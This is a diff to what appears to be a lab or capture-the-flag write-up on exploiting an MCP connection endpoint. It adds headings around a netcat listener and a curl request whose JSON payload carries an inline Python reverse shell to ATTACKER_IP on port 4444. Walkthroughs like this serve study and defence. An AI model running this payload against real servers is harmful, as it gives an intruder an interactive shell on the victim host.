@@ -747,6 +747,8 @@ This inline Python was inlined into the `args` array of the JSON payload.
 
 ### 3.2 Exploitation Execution
 
+#### 3.2.1 Start a netcat listener to catch the reverse shell
+
 **Command:** `nc -lvnp 4444` (on attacker)
 
 **Breakdown:**
@@ -764,7 +766,12 @@ This inline Python was inlined into the `args` array of the JSON payload.
 └─$ nc -lvnp 4444
 listening on [any] 4444 ...
 ```
+<div align="center">
+<br>
+<br>
+</div>
 
+#### 
 **Command:** `curl -s -X POST http://TARGET_IP:6274/api/mcp/connect -H "Content-Type: application/json" -d '{"serverConfig":{"type":"stdio","command":"python3","args":["-c","import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"],"serverId":"revshell"}}'`
 
 **Breakdown:**
